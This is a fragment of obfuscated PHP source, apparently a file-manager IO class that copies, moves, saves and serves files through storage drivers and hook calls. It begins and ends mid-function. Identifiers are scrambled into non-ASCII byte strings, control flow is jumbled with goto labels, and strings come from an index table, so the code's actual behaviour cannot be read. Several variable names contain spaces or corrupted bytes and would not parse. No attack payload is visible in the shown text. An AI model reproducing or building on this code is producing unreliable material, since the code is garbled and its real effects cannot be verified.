$bøè¡½Œ±Ò), $c»³êä¿½); } else { if (method_exists(self, $bøè¡½Œ±Ò)) { $a‰’ÛªÌÙ¤ = @call_user_func_array(array(self, $bøè¡½Œ±Ò), $c»³êä¿½); } else { $a‰’ÛªÌÙ¤ = call_user_func_array(array(parent, $bøè¡½Œ±Ò), $c»³êä¿½); } } } goto E˜Õëˆº‘Ó; d¿¬—“¦: $B‚¹õó©¢ˆ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $eİ¸†îÆ÷ = $c»³êä¿½; $GLOBALS[$B‚¹õó©¢ˆ[1007]] = $B‚¹õó©¢ˆ[1008] . $bøè¡½Œ±Ò; goto BÌÅ‹Äã°; E˜Õëˆº‘Ó: Hook::trigger($B‚¹õó©¢ˆ[1008] . $bøè¡½Œ±Ò . $B‚¹õó©¢ˆ[1011], $eİ¸†îÆ÷, $a‰’ÛªÌÙ¤); return $a‰’ÛªÌÙ¤; goto AÁƒ„ÊÂÄ¶; AÁƒ„ÊÂÄ¶: } public static function init($f•£–‘’Ì‘) { return self::driverMake($f•£–‘’Ì‘); } public static function copy($fÁ³³µ¨ßç, $F¤¼„¼†¨Ù, $EÎ ­Ó—° = false, $F§ÉÅ˜¼Ÿ = false) { return self::copyMoveStart($fÁ³³µ¨ßç, $F¤¼„¼†¨Ù, $EÎ ­Ó—°, $_SERVER[ÈİÅ¿ÈÈ¥×][507], $F§ÉÅ˜¼Ÿ); } public static function move($AÙòôˆ±ôô, $D±Š—¹Œæ, $E‚ŠÈÒµö‹ = false, $aŠ­áÔóâ = false) { return self::copyMoveStart($AÙòôˆ±ôô, $D±Š—¹Œæ, $E‚ŠÈÒµö‹, $_SERVER[ÈİÅ¿ÈÈ¥×][509], $aŠ­áÔóâ); } private static function copyMoveStart($c¬“Ú°íÕ×, $báÉ¤¤»àç, $B¸Š™ƒ·Ó¯, $cåç¶™·š‡, $b‘Áİã˜ª²) { $C¡¯Ó¬Õß‹ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $f­É…ÈÏè = array($c¬“Ú°íÕ×, $báÉ¤¤»àç, $B¸Š™ƒ·Ó¯, $b‘Áİã˜ª²); Hook::trigger($C¡¯Ó¬Õß‹[1008] . $cåç¶™·š‡ . $C¡¯Ó¬Õß‹[1009], $f­É…ÈÏè); $AßÜËˆÒª = self::copyMove($c¬“Ú°íÕ×, $báÉ¤¤»àç, $B¸Š™ƒ·Ó¯, $cåç¶™·š‡, $b‘Áİã˜ª²); Hook::trigger($C¡¯Ó¬Õß‹[1008] . $cåç¶™·š‡ . $C¡¯Ó¬Õß‹[1011], $f­É…ÈÏè, $AßÜËˆÒª); return $AßÜËˆÒª; } public static function saveFile($BÖáÊâÖ„ğ, $DÒ™Æ…‹–, $Dšò Ìî¡¤ = true) { goto Bå´³ÔŸ¨…; Bå´³ÔŸ¨…: $AÇ«æ½á­Á =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $Dˆ¿Ñ¬¦“Ë = self::info($DÒ™Æ…‹–); $C„šÄÚè’ = self::driverMake($BÖáÊâÖ„ğ); goto c¶áÉ¢İÁ; AÜöŸ§í: $aÌƒÀØ×Äî = self::copyFile($C„šÄÚè’, $BÖáÊâÖ„ğ, $Fğ‚âÄºÅ, $dŞ‹ËîğƒÇ, $Dˆ¿Ñ¬¦“Ë[$AÇ«æ½á­Á[28]], $Cñ‹‹†ÙÔİ); if ($dõÎ‹‚¬äß) { $aÌƒÀØ×Äî = $dõÎ‹‚¬äß->getPathOuter($aÌƒÀØ×Äî); } return $aÌƒÀØ×Äî; goto B®‚•­×£­; c¶áÉ¢İÁ: $Fğ‚âÄºÅ = self::driverMake($DÒ™Æ…‹–); $dõÎ‹‚¬äß = !1; if ($Fğ‚âÄºÅ->pathParse[$AÇ«æ½á­Á[1012]]) { $BĞ›ñ‘°ù = $Fğ‚âÄºÅ->pathParse[$AÇ«æ½á­Á[1012]]; $dõÎ‹‚¬äß = $Fğ‚âÄºÅ; $Fğ‚âÄºÅ = self::driverMake($BĞ›ñ‘°ù); } goto B¤ÕŠÄ©ˆ‡; B¤ÕŠÄ©ˆ‡: $dŞ‹ËîğƒÇ = $Fğ‚âÄºÅ->pathFather($DÒ™Æ…‹–); $Cñ‹‹†ÙÔİ = !0; if (!$Dšò Ìî¡¤ && self::driverIsSame($C„šÄÚè’, $Fğ‚âÄºÅ)) { $Cñ‹‹†ÙÔİ = !1; } goto AÜöŸ§í; B®‚•­×£­: } private static function copyMove($fé’âÏÛéß, $aÀêòÈ‹Ç, $EÔËĞÛ¿â†, $e¼øé¨ù¥ë, $fñØç‰Õ› = false) { goto bÈœ¿ê™É¸; béÃ»Ä³•î: if ($E”Ì‚ÜÆ†˜) { $f´êôÀï… = $E”Ì‚ÜÆ†˜->getPathOuter($f´êôÀï…); } return $f´êôÀï…; goto e…±‡±ºÈÌ; AùÊĞù´ù: Hook::trigger($a¨À¬ÚîÆÙ[72], $EŒƒÏ–¨ò¼, $fé’âÏÛéß, $B‚ÉÄ¸À¼¶, $aÀêòÈ‹Ç); $eó›ÜÚ®›¸ = self::driverIsSame($EŒƒÏ–¨ò¼, $B‚ÉÄ¸À¼¶); if ($eó›ÜÚ®›¸) { if ($e¼øé¨ù¥ë == $a¨À¬ÚîÆÙ[509] && !method_exists($B‚ÉÄ¸À¼¶, $a¨À¬ÚîÆÙ[1013]) && trim($aÀêòÈ‹Ç, $a¨À¬ÚîÆÙ[8]) == trim($B‚ÉÄ¸À¼¶->pathFather($fé’âÏÛéß), $a¨À¬ÚîÆÙ[8])) { if ($EŒƒÏ–¨ò¼->pathThis($fé’âÏÛéß) != $fñØç‰Õ› && !$EŒƒÏ–¨ò¼->isTypeObject()) { return $EŒƒÏ–¨ò¼->rename($fé’âÏÛéß, $fñØç‰Õ›); } return $B‚ÉÄ¸À¼¶->getPathOuter($fé’âÏÛéß); } if (method_exists($B‚ÉÄ¸À¼¶, $e¼øé¨ù¥ë)) { return $B‚ÉÄ¸À¼¶->{$e¼øé¨ù¥ë}($fé’âÏÛéß, $aÀêòÈ‹Ç, $EÔËĞÛ¿â†); } } goto Bï‚İ‡Ç™Ø; CùÆ£©¶ãì: $EŒƒÏ–¨ò¼ = self::driverMake($fé’âÏÛéß); $B‚ÉÄ¸À¼¶ = self::driverMake($aÀêòÈ‹Ç); $d·ŠŞÉë¼ = $e¼øé¨ù¥ë == $a¨À¬ÚîÆÙ[509]; goto c™Œ²ÍöÒÃ; c™Œ²ÍöÒÃ: $E”Ì‚ÜÆ†˜ = !1; if ($B‚ÉÄ¸À¼¶->pathParse[$a¨À¬ÚîÆÙ[1012]]) { $aÀêòÈ‹Ç = $B‚ÉÄ¸À¼¶->pathParse[$a¨À¬ÚîÆÙ[1012]]; $E”Ì‚ÜÆ†˜ = $B‚ÉÄ¸À¼¶; $B‚ÉÄ¸À¼¶ = self::driverMake($aÀêòÈ‹Ç); } self::check($EŒƒÏ–¨ò¼, $fé’âÏÛéß, $B‚ÉÄ¸À¼¶, $aÀêòÈ‹Ç); goto AùÊĞù´ù; bÈœ¿ê™É¸: $a¨À¬ÚîÆÙ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$fé’âÏÛéß || $fé’âÏÛéß == $a¨À¬ÚîÆÙ[8] || !$aÀêòÈ‹Ç) { return !1; } ignore_timeout(); goto CùÆ£©¶ãì; Bï‚İ‡Ç™Ø: $a½İÁ—¹¤ª = $EŒƒÏ–¨ò¼->isFile($fé’âÏÛéß); if (!$a½İÁ—¹¤ª && $B‚ÉÄ¸À¼¶->getType() == $a¨À¬ÚîÆÙ[702] && $EŒƒÏ–¨ò¼->getType() == $a¨À¬ÚîÆÙ[102]) { $f´êôÀï… = $B‚ÉÄ¸À¼¶->copyFolderFromIO($EŒƒÏ–¨ò¼, $fé’âÏÛéß, $aÀêòÈ‹Ç, $EÔËĞÛ¿â†, $d·ŠŞÉë¼, $fñØç‰Õ›); } else { $f´êôÀï… = self::copyPath($EŒƒÏ–¨ò¼, $fé’âÏÛéß, $B‚ÉÄ¸À¼¶, $aÀêòÈ‹Ç, $EÔËĞÛ¿â†, $d·ŠŞÉë¼, $a½İÁ—¹¤ª, $fñØç‰Õ›); } if ($f´êôÀï… && $d·ŠŞÉë¼) { $EŒƒÏ–¨ò¼->remove($fé’âÏÛéß); } goto béÃ»Ä³•î; e…±‡±ºÈÌ: } private static function check($d…ÁœÚØ¹Å, $f˜­‰•à», $AáÄºèŒ©«, &$FŠöñªù…©) { $FÕ“íÅÑË› =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (self::driverIsSame($d…ÁœÚØ¹Å, $AáÄºèŒ©«) && $d…ÁœÚØ¹Å->isFolder($f˜­‰•à») && $d…ÁœÚØ¹Å->isParentOf($f˜­‰•à», $FŠöñªù…©)) { show_json(LNG($FÕ“íÅÑË›[1014]), !1); } if (!$d…ÁœÚØ¹Å->exist($f˜­‰•à»)) { show_json(LNG($FÕ“íÅÑË›[101]), !1); } } private static function copyPath($a÷«íİ™ô, $Càˆ¡÷Ê´ù, $FÇ×“Ö¡Œ¢, $B¦»‰¹¥´Š, $Dğ¡ğ†¨ºã, $D°éì…ŞÖ¤, $bÛğ©õö›, $bàè…Õƒ¥ = false) { goto bˆÚ¹¹Ùñ¼; DŒøãĞ­á”: $AÊ¿æ…©±Ó = $FÇ×“Ö¡Œ¢->mkdir($FÇ×“Ö¡Œ¢->getPath($aáäª‰Ò¢×)); $B¦»‰¹¥´Š = $FÇ×“Ö¡Œ¢->getPathInner($AÊ¿æ…©±Ó); $Eåê›–†¨‘ = $a÷«íİ™ô->listPath($Càˆ¡÷Ê´ù, !0); goto C´øà‘æå÷; E¾×Ù³—ö¯: if ($bÛğ©õö›) { return self::copyFile($a÷«íİ™ô, $Càˆ¡÷Ê´ù, $FÇ×“Ö¡Œ¢, $B¦»‰¹¥´Š, $Eè©ÒŞ¬£™, $D°éì…ŞÖ¤); } if ($Dğ¡ğ†¨ºã == REPEAT_RENAME_FOLDER) { $Dğ¡ğ†¨ºã = !1; } $aáäª‰Ò¢× = rtrim($B¦»‰¹¥´Š, $f‰ÈÔóé[8]) . $f‰ÈÔóé[8] . $Eè©ÒŞ¬£™; goto DŒøãĞ­á”; C´øà‘æå÷: $b°’Ó º„ò = array_merge($Eåê›–†¨‘[$f‰ÈÔóé[73]], $Eåê›–†¨‘[$f‰ÈÔóé[74]]); foreach ($b°’Ó º„ò as $FìÕÛ—¨›ì) { $D¨ÑÖäŸ²Ü = $FìÕÛ—¨›ì[$f‰ÈÔóé[29]] == $f‰ÈÔóé[171]; $Càˆ¡÷Ê´ù = $a÷«íİ™ô->getPathInner($FìÕÛ—¨›ì[$f‰ÈÔóé[75]]); $AµÓÓá¸ƒÏ = self::copyPath($a÷«íİ™ô, $Càˆ¡÷Ê´ù, $FÇ×“Ö¡Œ¢, $B¦»‰¹¥´Š, $Dğ¡ğ†¨ºã, $D°éì…ŞÖ¤, $D¨ÑÖäŸ²Ü); if (!$AµÓÓá¸ƒÏ) { IO::errorTips($f‰ÈÔóé[1015] . $Càˆ¡÷Ê´ù . $f‰ÈÔóé[66] . $B¦»‰¹¥´Š); } } return $AÊ¿æ…©±Ó; goto e™·ôÎÀíÜ; bˆÚ¹¹Ùñ¼: $f‰ÈÔóé =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $Eè©ÒŞ¬£™ = $bàè…Õƒ¥ ? $bàè…Õƒ¥ : $a÷«íİ™ô->pathThis($Càˆ¡÷Ê´ù); if ($Dğ¡ğ†¨ºã) { $BÆÁæÛãÌ = $FÇ×“Ö¡Œ¢->fileNameExist($B¦»‰¹¥´Š, $Eè©ÒŞ¬£™); $Eè©ÒŞ¬£™ = $FÇ×“Ö¡Œ¢->fileNameAuto($B¦»‰¹¥´Š, $Eè©ÒŞ¬£™, $Dğ¡ğ†¨ºã, !$bÛğ©õö›); $Dğ¡ğ†¨ºã = $BÆÁæÛãÌ ? $Dğ¡ğ†¨ºã : !1; } goto E¾×Ù³—ö¯; e™·ôÎÀíÜ: } private static function copyFile($BŞÍ—Ì‡, $f´¯è‘¹´”, $F·•‹ë¹ÜÜ, $BĞè²¬Î„Á, $dÄ“ìçš‡³, $f˜ò™·™å) { goto B·¢àİÜ›İ; däÜÃ‚„‰: mk_dir($e£¹‚ß‡æ¿); $d¶Ã¡ÏÕ½ = $e£¹‚ß‡æ¿ . $aš¿éÖËƒ¾; $d¶Ã¡ÏÕ½ = $BŞÍ—Ì‡->download($f´¯è‘¹´”, $d¶Ã¡ÏÕ½); goto f½ƒ×İ³ç; f½ƒ×İ³ç: $d¶Ã¡ÏÕ½ = $BŞÍ—Ì‡->iconvApp($d¶Ã¡ÏÕ½); $fœïÃé÷ë  = $F·•‹ë¹ÜÜ->upload($BĞè²¬Î„Á, $d¶Ã¡ÏÕ½, $f˜ò™·™å); self::remove($e£¹‚ß‡æ¿ . $aš¿éÖËƒ¾); goto CŸŒƒç¾‰; CŸŒƒç¾‰: Hook::trigger($Fœ¯‹±‹‹—[1018], $BŞÍ—Ì‡, $f´¯è‘¹´”, $F·•‹ë¹ÜÜ, $BĞè²¬Î„Á, $dÄ“ìçš‡³, $fœïÃé÷ë ); return $fœïÃé÷ë ; goto c¬ê‡Üô‚; fÆ»Ó„“”ã: Hook::trigger($Fœ¯‹±‹‹—[1017], $BŞÍ—Ì‡, $f´¯è‘¹´”, $F·•‹ë¹ÜÜ, $BĞè²¬Î„Á, $dÄ“ìçš‡³, $aš¿éÖËƒ¾); if (self::driverIsSame($BŞÍ—Ì‡, $F·•‹ë¹ÜÜ)) { if ($f˜ò™·™å) { $fœïÃé÷ë  = $F·•‹ë¹ÜÜ->moveFile($f´¯è‘¹´”, $BĞè²¬Î„Á); } else { $fœïÃé÷ë  = $F·•‹ë¹ÜÜ->copyFile($f´¯è‘¹´”, $BĞè²¬Î„Á); } Hook::trigger($Fœ¯‹±‹‹—[1018], $BŞÍ—Ì‡, $f´¯è‘¹´”, $F·•‹ë¹ÜÜ, $BĞè²¬Î„Á, $dÄ“ìçš‡³, $fœïÃé÷ë ); return $fœïÃé÷ë ; } $e£¹‚ß‡æ¿ = TEMP_FILES; goto däÜÃ‚„‰; B·¢àİÜ›İ: $Fœ¯‹±‹‹— =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $BĞè²¬Î„Á = $F·•‹ë¹ÜÜ->getPath(rtrim($BĞè²¬Î„Á, $Fœ¯‹±‹‹—[8]) . $Fœ¯‹±‹‹—[8] . $dÄ“ìçš‡³); $aš¿éÖËƒ¾ = $Fœ¯‹±‹‹—[1016] . time() . rand_string(5); goto fÆ»Ó„“”ã; c¬ê‡Üô‚: } public static function pathFather($A„©¨Ä·ï‡) { $B†–ÎÀÏø = IO::init($A„©¨Ä·ï‡); $c­âÁÈç½ = $B†–ÎÀÏø->pathFather($B†–ÎÀÏø->path); return $B†–ÎÀÏø->getPathOuter($c­âÁÈç½); } public static function fileOut($CØÔÕùÕ´Ê, $a‡ÓÓå˜ÈÁ = false, $B˜’¸Ãóá = false, $B‹ºº¹Ó›Ä = '') { $B›ÑÎ¡¥í¡ = self::driverMake($CØÔÕùÕ´Ê); if ($B›ÑÎ¡¥í¡->isFileOutServer()) { return $B›ÑÎ¡¥í¡->fileOutServer($CØÔÕùÕ´Ê, $a‡ÓÓå˜ÈÁ, $B˜’¸Ãóá, $B‹ºº¹Ó›Ä); } return $B›ÑÎ¡¥í¡->fileOut($CØÔÕùÕ´Ê, $a‡ÓÓå˜ÈÁ, $B˜’¸Ãóá, $B‹ºº¹Ó›Ä); } public static function fileOutImage($EóïóÜƒÆ, $F¯¦íâ–„‹ = 250) { $bÕƒ±‘“ãë = array(250, 600, 1200, 3000, 5000); for ($EÙ°¾ÅÖæç = 0; $EÙ°¾ÅÖæç < count($bÕƒ±‘“ãë); $EÙ°¾ÅÖæç++) { if ($EÙ°¾ÅÖæç == 0 && $F¯¦íâ–„‹ <= $bÕƒ±‘“ãë[$EÙ°¾ÅÖæç]) { $F¯¦íâ–„‹ = $bÕƒ±‘“ãë[$EÙ°¾ÅÖæç]; break; } else { if ($F¯¦íâ–„‹ > $bÕƒ±‘“ãë[$EÙ°¾ÅÖæç - 1] && $F¯¦íâ–„‹ <= $bÕƒ±‘“ãë[$EÙ°¾ÅÖæç]) { $F¯¦íâ–„‹ = $bÕƒ±‘“ãë[$EÙ°¾ÅÖæç]; break; } else { if ($EÙ°¾ÅÖæç == count($bÕƒ±‘“ãë) - 1 && $F¯¦íâ–„‹ > $bÕƒ±‘“ãë[$EÙ°¾ÅÖæç]) { $F¯¦íâ–„‹ = $bÕƒ±‘“ãë[$EÙ°¾ÅÖæç]; break; } } } } $Añ¨ÖÓ˜ = self::driverMake($EóïóÜƒÆ); if ($Añ¨ÖÓ˜->isFileOutServer()) { return $Añ¨ÖÓ˜->fileOutImageServer($EóïóÜƒÆ, $F¯¦íâ–„‹); } return $Añ¨ÖÓ˜->fileOutImage($EóïóÜƒÆ, $F¯¦íâ–„‹); } private static function driverIsSame($F‚¥İÈ¥®Ş, $e³¢ç«) { goto f¢’ò«à”Ô; aËˆâÜãñ¹: if ($F‚¥İÈ¥®Ş->pathDriver == $e³¢ç«->pathDriver) { return !0; } return !1; goto E–‡åáŞ´À; FŒ…ìİœ”‚: if ($CğÖëĞ–’¬ != $BìÂÛ®ˆ½) { return !1; } if ($CğÖëĞ–’¬ == $b¹Èš™ ØÌ[702]) { return !0; } if ($CğÖëĞ–’¬ == $b¹Èš™ ØÌ[102]) { return !0; } goto aËˆâÜãñ¹; f¢’ò«à”Ô: $b¹Èš™ ØÌ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $CğÖëĞ–’¬ = $F‚¥İÈ¥®Ş->getType(); $BìÂÛ®ˆ½ = $e³¢ç«->getType(); goto FŒ…ìİœ”‚; E–‡åáŞ´À: } public static function copyUpdate($cŸÕÜ„ŸŸ—, $b‹¨ÉßÍÚø) { goto a ¹†ŞÇ; A†Óœ”æ’µ: $BÀ’£ÜÔ±‘ = array(); foreach ($AÉÍ‘ø–ó† as $eİ¯Ø‰ˆÛ => $A›¿¾‘‰Â) { if (isset($f¢ÙÑò³©È[$eİ¯Ø‰ˆÛ])) { if ($A›¿¾‘‰Â[$f§ğÑˆ‡©÷[76]] == 1) { continue; } if ($f¢ÙÑò³©È[$eİ¯Ø‰ˆÛ][$f§ğÑˆ‡©÷[77]] == $A›¿¾‘‰Â[$f§ğÑˆ‡©÷[77]]) { continue; } } if ($A›¿¾‘‰Â[$f§ğÑˆ‡©÷[76]] == 1) { $BÀ’£ÜÔ±‘[] = $b‹¨ÉßÍÚø . $f§ğÑˆ‡©÷[8] . $eİ¯Ø‰ˆÛ; continue; } $f•£Èõæòè = strstr(trim($eİ¯Ø‰ˆÛ, $f§ğÑˆ‡©÷[8]), $f§ğÑˆ‡©÷[8]) ? get_path_father($eİ¯Ø‰ˆÛ) : $f§ğÑˆ‡©÷[33]; $a…£èœ²ğ¬[] = array($f§ğÑˆ‡©÷[1019] => $A›¿¾‘‰Â[$f§ğÑˆ‡©÷[75]], $f§ğÑˆ‡©÷[1020] => rtrim($b‹¨ÉßÍÚø, $f§ğÑˆ‡©÷[8]) . $f§ğÑˆ‡©÷[8] . $f•£Èõæòè, $f§ğÑˆ‡©÷[1021] => $A›¿¾‘‰Â); } $E»Ìë ÷¨Ô = array($f§ğÑˆ‡©÷[171] => $a…£èœ²ğ¬, $f§ğÑˆ‡©÷[76] => $BÀ’£ÜÔ±‘); goto e›È¬ ˆùÀ; e›È¬ ˆùÀ: Hook::trigger($f§ğÑˆ‡©÷[1022], $cŸÕÜ„ŸŸ—, $b‹¨ÉßÍÚø, $E»Ìë ÷¨Ô); foreach ($BÀ’£ÜÔ±‘ as $A›¿¾‘‰Â) { IO::mkdir($A›¿¾‘‰Â); } foreach ($a…£èœ²ğ¬ as $A›¿¾‘‰Â) { IO::copy($A›¿¾‘‰Â[$f§ğÑˆ‡©÷[1019]], $A›¿¾‘‰Â[$f§ğÑˆ‡©÷[1020]], REPEAT_REPLACE); } goto eµÉÆÆÚó; dÚ¯ß‹¸«: $AÉÍ‘ø–ó† = self::_listAll($cŸÕÜ„ŸŸ—); $f¢ÙÑò³©È = self::_listAll($b‹¨ÉßÍÚø); $a…£èœ²ğ¬ = array(); goto A†Óœ”æ’µ; a ¹†ŞÇ: $f§ğÑˆ‡©÷ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!IO::exist($cŸÕÜ„ŸŸ—)) { return !1; } if (!IO::exist($b‹¨ÉßÍÚø)) { IO::mkdir($b‹¨ÉßÍÚø); } goto dÚ¯ß‹¸«; eµÉÆÆÚó: } private static function _listAll($FÜ¿ææÒÎø) { $bå  ËÍÈ¤ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $FÜ¿ææÒÎø = KodIO::clear($FÜ¿ææÒÎø); $E­î®¿èÅ = IO::listAll($FÜ¿ææÒÎø); foreach ($E­î®¿èÅ as &$cÀÌ¦ÎšÓ) { $DØáï÷Òæ„ = substr($cÀÌ¦ÎšÓ[$bå  ËÍÈ¤[75]], strlen($FÜ¿ææÒÎø)); $cÀÌ¦ÎšÓ[$bå  ËÍÈ¤[1023]] = trim($DØáï÷Òæ„, $bå  ËÍÈ¤[8]); } unset($cÀÌ¦ÎšÓ); return array_to_keyvalue($E­î®¿èÅ, $bå  ËÍÈ¤[1023]); } public static function fileSubstr($f½ï³ÏÃÏ, $AŸë«×Ş‰‘, $c—‰¨‰ó¢ = false) { goto b‘öÅŠ¬Å; b‘öÅŠ¬Å: $F³Éš»© =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $Cáâë›ˆôÊ = self::driverMake($f½ï³ÏÃÏ); $fªğÁ×‹ïî = $Cáâë›ˆôÊ->size($f½ï³ÏÃÏ); goto bæŸÉ²Ì¨£; Bçî‰öæíÜ: if (!$Eß”ÇÁ¤…“ && $c—‰¨‰ó¢ && isset($GLOBALS[$F³Éš»©[1026]])) { throw new Exception($GLOBALS[$F³Éš»©[1026]][$F³Éš»©[1027]]); } return $Eß”ÇÁ¤…“; goto cóíŠŞË½‘; A–ôàÎÖßØ: if ($c—‰¨‰ó¢ === !1) { $c—‰¨‰ó¢ = $fªğÁ×‹ïî - $AŸë«×Ş‰‘; } if ($AŸë«×Ş‰‘ + $c—‰¨‰ó¢ > $fªğÁ×‹ïî) { $c—‰¨‰ó¢ = $fªğÁ×‹ïî - $AŸë«×Ş‰‘; } if (!$fªğÁ×‹ïî && $Cáâë›ˆôÊ->getType() == $F³Éš»©[102] && !$Cáâë›ˆôÊ->exist($f½ï³ÏÃÏ)) { throw new Exception($F³Éš»©[1024] . LNG($F³Éš»©[1025])); } goto dø¦×›óñ½; dø¦×›óñ½: if ($c—‰¨‰ó¢ <= 0) { return $F³Éš»©[33]; } if ($AŸë«×Ş‰‘ < 0 || $AŸë«×Ş‰‘ >= $fªğÁ×‹ïî || $c—‰¨‰ó¢ > 1024 * 1024 * 5) { throw new Exception("\x66\x69\x6c\145\122\145\141\x64\40\145\x72\162\x6f\162\x21\40\x73\x74\x61\x72\x74\x3d{$AŸë«×Ş‰‘}\73\x6c\x65\156\147\x74\150\x3d{$c—‰¨‰ó¢}\73\40\x73\x69\172\x65\75{$fªğÁ×‹ïî}\x3b"); } $Eß”ÇÁ¤…“ = $Cáâë›ˆôÊ->fileSubstr($f½ï³ÏÃÏ, $AŸë«×Ş‰‘, $c—‰¨‰ó¢); goto Bçî‰öæíÜ; bæŸÉ²Ì¨£: $Có½ƒËã³Î = $AŸë«×Ş‰‘; $a«ÅÕ¶¡Ò = $c—‰¨‰ó¢; if ($AŸë«×Ş‰‘ < 0) { $AŸë«×Ş‰‘ = $fªğÁ×‹ïî + $AŸë«×Ş‰‘; } goto A–ôàÎÖßØ; cóíŠŞË½‘: } private static function driverMake(&$B…Ô±¥°ØØ) { goto aå¼ÈßŸŠÆ; aå¼ÈßŸŠÆ: $BˆŠÇæ¨Ä¯ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $díŠÎğ¿š = KodIO::parse($B…Ô±¥°ØØ); if (!self::$driverListSystem) { $fÀæÌëìÜë = Model($BˆŠÇæ¨Ä¯[711])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($fÀæÌëìÜë, $BˆŠÇæ¨Ä¯[383]); } goto a‘Á¶è¨æ; fããª‘Ö‹: return $F÷õ•÷ªõœ; goto e‹š†šÇØ‹; a‘Á¶è¨æ: if ($díŠÎğ¿š[$BˆŠÇæ¨Ä¯[29]] == KodIO::KOD_IO && !self::$driverListSystem[$díŠÎğ¿š[$BˆŠÇæ¨Ä¯[383]]]) { return !1; } $B…Ô±¥°ØØ = $díŠÎğ¿š[$BˆŠÇæ¨Ä¯[1028]]; $F÷õ•÷ªõœ = self::driverGet($díŠÎğ¿š, $B…Ô±¥°ØØ); goto fããª‘Ö‹; e‹š†šÇØ‹: } private static function driverGet($B‡ÌîĞŞÛ, &$Cñè„©È‚ö) { goto a›ÄÙ„¿…; a›ÄÙ„¿…: $cñ½ËØµï =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $f‹áÒò£Ù = $B‡ÌîĞŞÛ[$cñ½ËØµï[1029]]; $fÔˆØçš¨ù = $B‡ÌîĞŞÛ[$cñ½ËØµï[383]]; goto aó¶¹²‹´‚; aó¶¹²‹´‚: switch ($B‡ÌîĞŞÛ[$cñ½ËØµï[29]]) { case KodIO::KOD_IO: $c¥÷íß¡ìÃ = self::$driverListSystem[$fÔˆØçš¨ù]; break; case KodIO::KOD_SOURCE: $Cñè„©È‚ö = $fÔˆØçš¨ù . $Cñè„©È‚ö; $c¥÷íß¡ìÃ = array($cñ½ËØµï[1030] => $cñ½ËØµï[1031], $cñ½ËØµï[6] => $B‡ÌîĞŞÛ); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $bã÷î÷è†™ = $GLOBALS[$cñ½ËØµï[1032]]; self::$driverListUser = array_to_keyvalue($bã÷î÷è†™, $cñ½ËØµï[383]); } $c¥÷íß¡ìÃ = self::$driverListUser[$fÔˆØçš¨ù]; break; case KodIO::KOD_SHARE_LINK: $c¥÷íß¡ìÃ = array($cñ½ËØµï[1030] => $cñ½ËØµï[1033], $cñ½ËØµï[6] => $B‡ÌîĞŞÛ); $a·ù‚‡ãÌ† = Action($cñ½ËØµï[1034])->sharePathInfo($B‡ÌîĞŞÛ[$cñ½ËØµï[75]]); $Cñè„©È‚ö = $a·ù‚‡ãÌ†[$cñ½ËØµï[385]]; if (!$a·ù‚‡ãÌ†[$cñ½ËØµï[385]]) { $dÏ‹Ş§”§¶ = Model($cñ½ËØµï[552])->getInfo($a·ù‚‡ãÌ†[$cñ½ËØµï[456]]); $Cñè„©È‚ö = KodIO::clear($dÏ‹Ş§”§¶[$cñ½ËØµï[1035]] . $B‡ÌîĞŞÛ[$cñ½ËØµï[1028]]); $B‡ÌîĞŞÛ[$cñ½ËØµï[454]] = $dÏ‹Ş§”§¶; $B‡ÌîĞŞÛ[$cñ½ËØµï[1012]] = $Cñè„©È‚ö; $c¥÷íß¡ìÃ = array($cñ½ËØµï[1030] => $cñ½ËØµï[1036], $cñ½ËØµï[6] => $B‡ÌîĞŞÛ); } break; case KodIO::KOD_SHARE_ITEM: $c¥÷íß¡ìÃ = array($cñ½ËØµï[1030] => $cñ½ËØµï[1037], $cñ½ËØµï[6] => $B‡ÌîĞŞÛ); $dÏ‹Ş§”§¶ = Model($cñ½ËØµï[552])->getInfo($B‡ÌîĞŞÛ[$cñ½ËØµï[383]]); if ($dÏ‹Ş§”§¶[$cñ½ËØµï[385]] == $cñ½ËØµï[485]) { $Cñè„©È‚ö = KodIO::clear($dÏ‹Ş§”§¶[$cñ½ËØµï[1035]] . $B‡ÌîĞŞÛ[$cñ½ËØµï[1028]]); $B‡ÌîĞŞÛ[$cñ½ËØµï[454]] = $dÏ‹Ş§”§¶; $B‡ÌîĞŞÛ[$cñ½ËØµï[1012]] = $Cñè„©È‚ö; $c¥÷íß¡ìÃ = array($cñ½ËØµï[1030] => $cñ½ËØµï[1038], $cñ½ËØµï[6] => $B‡ÌîĞŞÛ); } else { if (!$Cñè„©È‚ö) { $Cñè„©È‚ö = $dÏ‹Ş§”§¶[$cñ½ËØµï[385]]; } } break; default: $Cñè„©È‚ö = $B‡ÌîĞŞÛ[$cñ½ËØµï[75]]; $c¥÷íß¡ìÃ = array($cñ½ËØµï[1030] => $cñ½ËØµï[1039]); break; } $FİğØÙÓ®Ø = $B‡ÌîĞŞÛ[$cñ½ËØµï[75]]; if (!isset(self::$driverCache[$FİğØÙÓ®Ø])) { $DåÄè‰—Í¤ = strtolower($c¥÷íß¡ìÃ[$cñ½ËØµï[90]]); $F­¦òÓ„Ê† = $GLOBALS[$cñ½ËØµï[6]][$cñ½ËØµï[84]][$cñ½ËØµï[760]]; $dË„Áóáï = $cñ½ËØµï[71] . (isset($F­¦òÓ„Ê†[$DåÄè‰—Í¤]) ? $F­¦òÓ„Ê†[$DåÄè‰—Í¤] : ucfirst($DåÄè‰—Í¤)); if (!class_exists($dË„Áóáï)) { show_json("{$dË„Áóáï}\40\x6e\x6f\x74\x20\x65\x78\151\x73\x74\163\41", !1); } $fõ¦ˆÑˆ° = isset($c¥÷íß¡ìÃ[$cñ½ËØµï[6]]) ? $c¥÷íß¡ìÃ[$cñ½ËØµï[6]] : !1; self::$driverCache[$FİğØÙÓ®Ø] = new $dË„Áóáï($fõ¦ˆÑˆ°); } goto aİ‚¸œ‡‡; fØ¯·¨¾ßÀ: $eŒ…è¬ÃÒ->path = $Cñè„©È‚ö; return $eŒ…è¬ÃÒ; goto Fé„¹Ô„Ü·; 